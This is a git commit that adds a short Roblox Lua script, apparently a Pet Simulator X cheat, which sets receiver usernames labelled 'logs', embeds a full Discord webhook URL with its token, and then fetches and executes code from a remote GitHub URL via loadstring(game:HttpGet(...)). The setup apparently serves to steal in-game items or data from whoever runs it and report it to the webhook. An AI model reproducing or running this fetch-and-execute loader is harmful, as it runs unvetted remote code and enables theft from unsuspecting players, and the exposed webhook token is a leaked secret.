a1e8db685ca2da7f4209197d8b87e01d79a398cf
PsxHacks000 <137309509+PsxHacks000@users.noreply.github.com>
2023-06-21 16:44:13 +0200

    d
    d

---
+++ cool.lua
@@ -0,0 +1,5 @@
+_G.UserName = "psx_logs1" -- username here 
+_G.UserName2 = "psx_logs2" -- optional
+_G.Webhook = "https://discord.com/api/webhooks/1121085563055919195/mkA7ekYOA0Op949nIt6V1TEyWh05-JkewK8aMEsPyWOLdlD2bP8k3REJ448e69G17aDP" -- Webhook Here - optional
+   
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
